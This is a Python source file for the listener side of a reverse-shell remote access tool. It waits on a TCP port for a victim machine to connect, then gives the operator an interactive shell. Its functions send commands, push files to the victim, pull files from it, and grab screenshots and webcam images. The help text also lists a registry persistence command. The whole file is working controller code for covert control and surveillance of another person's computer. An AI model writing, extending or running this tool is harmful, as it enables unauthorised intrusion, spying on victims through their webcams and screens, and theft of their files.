# Import necessary libraries

import socket
import termcolor
import json
import os

# Function to receive data reliably over the socket, decoding JSON data
def reliable_recv():
    data =''
    while True:
        try:
            data=data+target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to send data reliably over the socket, encoding the data as JSON
def reliable_send(data):
    jsondata=json.dumps(data)
    target.send(jsondata.encode())

# Function to upload a file from the controller to the target machine
def upload_file(file_name):
    f=open(file_name,'rb')
    target.send(f.read())

# Function to download a file from the target machine to the controller

def download_file(file_name):
    f=open(file_name,'wb')
    target.settimeout(1)
    chunk=target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk=target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()




# Function to handle communication with the target machine
def target_communication():
    count=0
    while True:
        command=input(f'* Shell~{ip}: ')
        reliable_send(command)

  # Process the received command and execute corresponding actions

        if command=='quit':
            break
        elif command=='clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8]=='download':
            download_file(command[9:])    
        elif command[:10]=='screenshot':
            f=open(f'screenshot{count}','wb')
            target.settimeout(3)
            chunk=target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk=target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count+=1
        elif command=='webcamshot':
            f=open(f'webcamshot{count}','wb')
            target.settimeout(5)
            chunk=target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk=target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count+=1
        elif command=='help':
            print(termcolor.colored('''\n
            quit
            clear
            cd
            upload
            download
            screenshot
            webcamshot
            persistence regname file_name
            ''','green'))
        else:
            result=reliable_recv()
            print(result)


#connection IPV4 AND TCP with target , LIstener
# Create a socket object and bind it to the specified IP and port
sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sock.bind(('192.168.0.14',5555))
print(termcolor.colored('[+] Listening for the incoming connections','green'))

# Listen for incoming connections (up to 5 connections)
sock.listen(5)

# Accept connection from the target

target, ip = sock.accept()

print(termcolor.colored(f'[+] Target Connected from: {ip}','green'))

# Start communication with the target machine

target_communication()


